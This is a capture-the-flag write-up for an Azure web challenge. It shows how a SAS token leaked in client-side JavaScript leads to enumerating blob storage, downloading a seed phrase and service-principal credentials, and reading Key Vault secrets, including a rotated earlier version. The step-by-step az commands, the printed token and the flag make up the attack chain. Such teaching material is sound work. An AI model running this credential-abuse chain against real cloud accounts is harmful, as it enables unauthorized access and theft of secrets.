Title: CryptoCabana

#### Category: Web

#### Difficulty: Medium

#### Description: 

He never signed the transfer. The place he stashed his secret wasn't as sealed as promised.

---

## Task 1: Azure Portal Access

Since this challenge uses Azure resources, we first need to configure our environment before interacting with the lab.

#### Install Azure CLI

Follow Microsoft's installation guide:
```https://learn.microsoft.com/en-us/cli/azure/install-azure-cli-linux```

<img width="784" height="505" alt="image" src="https://github.com/user-attachments/assets/42abba62-76db-4296-81c2-659fdb88c9b0" />

Install Azure CLI:
```
curl -fsSL 'https://azurecliprod.blob.core.windows.net/$root/deb_install.sh' | sudo bash
```

<img width="742" height="474" alt="image" src="https://github.com/user-attachments/assets/3da62cf8-a499-43a6-88de-705e55620ae3" />

Verify the installation:
``` az --version ```

<img width="276" height="220" alt="image" src="https://github.com/user-attachments/assets/6b40830d-16fa-4e3d-a323-1439dc4c2f94" />


Join the Lab
Click Cloud Details and Join Lab.

<img width="1692" height="409" alt="image" src="https://github.com/user-attachments/assets/bc9f5466-591d-424c-ae4b-7d7e2aecb05c" />

Open the Azure Portal:
```https://portal.azure.com/```

Once logged in:

> Open Cloud Shell
> Select Bash
> Choose No storage account required
> Select Az-Subs-CTF
> Verify access:

```az account show```

<img width="1917" height="922" alt="image" src="https://github.com/user-attachments/assets/48f0ad3f-9c8e-4389-9a6a-4576226d3f08" />


---

## Task 2: Hacker Holidays: Day 9

<img width="855" height="870" alt="image" src="https://github.com/user-attachments/assets/0056c0a2-94ce-4574-980e-9d96978e5859" />

<img width="871" height="765" alt="image" src="https://github.com/user-attachments/assets/006edb1a-b645-4edd-ac85-15e5beac88a7" />


#### Analysis: 

Unlike the previous web challenges, this one focuses on cloud storage misconfigurations.

The application stores users' wallet backups inside Azure Blob Storage using a Shared Access Signature (SAS) token embedded directly in the client-side JavaScript.

Although the application only intends to let users upload and access their own backups, exposing the SAS token allows anyone to enumerate accessible storage containers. This eventually leads to a backup service account, which provides access to Azure Key Vault where the flag is stored.


---

### Methodology

#### Part 1 – Inspect the Website
Open the application

```https://cryptocabanaf5scjagc.z13.web.core.windows.net/```

<img width="1420" height="773" alt="image" src="https://github.com/user-attachments/assets/0ffad43a-25d3-4f99-9243-579f863d1b1b" />

Open Developer Tools.

Enter random text and click Backup.

Inspect the generated request under Network.

<img width="1716" height="538" alt="image" src="https://github.com/user-attachments/assets/fff3aeb9-e180-47d3-9588-8d662397156d" />

Notice the request URL:
```
https://cryptocabanaf5scjagc.blob.core.windows.net/backups/backup-1785929856192.txt??sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D
```
This query string is an Azure Shared Access Signature (SAS).

A SAS token grants temporary access to Azure Storage without requiring an Azure account.

The important permission here is:

> sp=rl

where:
- r = Read
- l = List

Although this token cannot upload or modify files, it can enumerate containers and download existing blobs.



#### Part 2 – Inspect app.js

Open app.js.

<img width="1174" height="575" alt="image" src="https://github.com/user-attachments/assets/7cb75957-4723-4af7-9bc0-1cbd79cb2223" />

The application exposes several important values:

```
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";

const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";

```

#### Analysis:

This tells us:

- the Azure Storage Account name
- the reusable SAS token

These are all we need to interact with the storage account directly using Azure CLI.





#### Part 3 – Prepare Azure CLI

Store the values in shell variables.

```
ACCOUNT='cryptocabanaf5scjagc'

SAS='sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D'
```

<img width="1549" height="244" alt="image" src="https://github.com/user-attachments/assets/7a643fe0-42b5-4cd8-bf33-191db5d4eecf" />

Why use variables?

> Instead of typing the long storage account name and SAS token repeatedly, we save them as variables so every Azure CLI command becomes shorter and easier to read.


#### Part 4 – Enumerate Storage Containers

List every container:

```
az storage container list \
  --account-name "$ACCOUNT" \
  --sas-token "$SAS" \
  --query '[].name' \
  --output table
```

<img width="1533" height="478" alt="image" src="https://github.com/user-attachments/assets/f416ed60-1586-4126-8eb5-6fcbe3d939e9" />

A container named vault immediately stands out.

Since the challenge revolves around cryptocurrency backups, this is likely where the sensitive data is stored.

#### Part 5 – Enumerate the Vault

List every blob inside the vault.

```
az storage blob list \
  --account-name "$ACCOUNT" \
  --container-name 'vault' \
  --sas-token "$SAS" \
  --query '[].{Name:name,Size:properties.contentLength,Modified:properties.lastModified}' \
  --output table
```

<img width="1530" height="475" alt="image" src="https://github.com/user-attachments/assets/4813a53b-f865-46d4-87be-581a96727f5e" />

We discover several interesting files, including:

> seed_phrase.txt
> 
> backup-service-account.json

#### Part 6 – Download the Seed Phrase

Download:

```
az storage blob download \
  --account-name "$ACCOUNT" \
  --container-name 'vault' \
  --name 'seed_phrase.txt' \
  --sas-token "$SAS" \
  --file seed_phrase.txt \
  --output none

```

<img width="801" height="178" alt="image" src="https://github.com/user-attachments/assets/105272a1-d49b-4e9b-b16f-31f9f5673d9a" />

Read it:

```
cat seed_phrase.txt
```

<img width="992" height="45" alt="image" src="https://github.com/user-attachments/assets/ad9cdd6b-d98e-4c44-b915-8f3351b4c834" />


``` velvet cabana rebuild scatter obvious wallet drift lagoon punchline receipt orbit shrimp```



#### Part 7 – Download the Service Account

Download:

```
az storage blob download \
  --account-name "$ACCOUNT" \
  --container-name 'vault' \
  --name 'backup-service-account.json' \
  --sas-token "$SAS" \
  --file backup-service-account.json \
  --output none
```

<img width="754" height="181" alt="image" src="https://github.com/user-attachments/assets/2e819dfa-db2d-4272-bd02-c94dd365f00d" />

Print it:

```
jq . backup-service-account.json
```

<img width="921" height="195" alt="image" src="https://github.com/user-attachments/assets/862eb573-f230-4193-8719-029363153a24" />

#### Analysis: 

The JSON file contains credentials for an Azure Service Principal.

Unlike a normal user account, a Service Principal is intended for applications and automation.

The credentials include:

- Client ID
- Client Secret
- Tenant ID
- Key Vault name

This gives us a second set of credentials with greater privileges than the exposed SAS token.

#### Part 8 – Authenticate as the Service Principal

Extract the credentials:
```
CLIENT_ID=$(jq -r '.client_id' backup-service-account.json)
CLIENT_SECRET=$(jq -r '.client_secret' backup-service-account.json)
TENANT_ID=$(jq -r '.tenant_id' backup-service-account.json)
VAULT_NAME=$(jq -r '.key_vault_name' backup-service-account.json)
```

Authenticate:

```
az login \
  --service-principal \
  --username "$CLIENT_ID" \
  --password "$CLIENT_SECRET" \
  --tenant "$TENANT_ID" \
  --allow-no-subscriptions \
  --output none

```

<img width="1288" height="425" alt="image" src="https://github.com/user-attachments/assets/5efe5db0-1e9d-4b55-a13b-9c05f19490db" />


Verify the identity:

```
az account show --query user --output json

```

<img width="581" height="121" alt="image" src="https://github.com/user-attachments/assets/bdb6bf31-9d26-49ec-824d-3015d7f2193f" />

We are now authenticated as a Service Principal.

#### Part 9 – Enumerate Azure Key Vault

List all secrets:

```
az keyvault secret list \
  --vault-name "$VAULT_NAME" \
  --query '[].{Name:name,Enabled:attributes.enabled,Updated:attributes.updated}' \
  --output table

```
<img width="771" height="219" alt="image" src="https://github.com/user-attachments/assets/b985597c-7b3b-4afa-866f-3e9bf22deaf3" />

Three secrets are available:

> key-shard-1
> 
> key-shard-2
> 
> key-shard-3

Retrieve each one:


key-shard-1: 
```
az keyvault secret show \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-1' \
  --query value \
  --output tsv
```

<img width="750" height="306" alt="image" src="https://github.com/user-attachments/assets/85d8bb90-6b2b-4fd1-8a63-722517ea08dc" />


key-shard-2: 
```
az keyvault secret show \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-2' \
  --query value \
  --output tsv
```

<img width="920" height="145" alt="image" src="https://github.com/user-attachments/assets/37934a5a-5f20-4c27-81b8-2fef0e1478ab" />


key-shard-3: 
```
az keyvault secret show \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-3' \
  --query value \
  --output tsv
```
<img width="418" height="139" alt="image" src="https://github.com/user-attachments/assets/1758047f-92e1-4812-9595-ff9c9f0cf603" />

Shards 1 and 3 immediately reveal portions of the flag.
However, Shard 2 only returns:
> Old value.


#### Part 10 – Recover the Previous Version

Azure Key Vault keeps previous versions whenever a secret is updated.

List all versions:
```
az keyvault secret list-versions \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-2' \
  --query '[].{Version:id,Created:attributes.created,Updated:attributes.updated,Enabled:attributes.enabled}' \
  --output table
```
<img width="1463" height="202" alt="image" src="https://github.com/user-attachments/assets/cb978409-2df1-4e33-b31d-ab0e58b90710" />

Notice the earliest version.

Retrieve it:

```
az keyvault secret show \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-2' \
  --version '3d6492d2c6f74123bc754a9ded22b2a0' \
  --query value \
  --output tsv
```

<img width="463" height="160" alt="image" src="https://github.com/user-attachments/assets/867e8868-cc21-4dcb-8001-871c6edda2d1" />

This reveals the missing portion of the flag.

Combine all three shards to recover the complete flag.


---

### Today's Itinerary

1. Pull apart what the kiosk hands out for free before you've even clicked anything.
> Inspect the application and identify the exposed Azure Storage credentials (SAS token).

2. Follow that trust somewhere the kiosk's own page never once points you.
> Use the leaked SAS token to enumerate Azure Blob Storage and discover sensitive backup files.

3. Somewhere in there is a second, more valuable set of keys - and a vault that won't give up the real values on the first ask.
> Recover the exposed Service Principal credentials, authenticate to Azure, access Azure Key Vault, retrieve the previous version of the rotated secret, and reconstruct the complete flag.

---

### Flag
> THM{n0t_ur_k3ys_n0t_ur_c01ns!}

This challenge demonstrates how exposing cloud credentials on the client side can lead to a complete compromise of cloud resources. The leaked Azure SAS token allowed enumeration of storage containers and access to sensitive backup files. Among those files was a Service Principal configuration containing privileged credentials, which granted access to Azure Key Vault. Even though one of the secrets had been rotated, Azure's built-in version history allowed recovery of the previous value, enabling reconstruction of the full flag. The challenge highlights the importance of protecting cloud credentials, limiting SAS permissions, and carefully managing sensitive data stored in cloud services.
